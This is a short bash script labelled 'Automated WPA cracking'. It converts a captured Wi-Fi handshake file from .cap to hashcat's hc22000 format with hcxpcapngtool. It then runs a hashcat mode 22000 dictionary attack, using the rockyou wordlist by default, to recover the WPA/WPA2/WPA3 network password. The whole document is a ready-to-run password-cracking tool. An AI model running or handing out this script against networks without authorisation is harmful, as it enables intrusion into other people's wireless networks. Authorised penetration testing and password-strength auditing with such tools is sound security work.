#!/bin/bash
# Automated WPA cracking
FILE="${1:?Usage: $0 <.cap/.pcapng/.hc22000 file>}"
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"

# Convert if needed
if [[ "$FILE" == *.cap ]]; then
    hcxpcapngtool -o "${FILE%.cap}.hc22000" "$FILE"
    FILE="${FILE%.cap}.hc22000"
fi

# Run hashcat (mode 22000 unified WPA/WPA2/WPA3 handshake format)
echo "[*] Cracking with hashcat mode 22000..."
hashcat -m 22000 -a 0 "$FILE" "$WORDLIST" --force -O
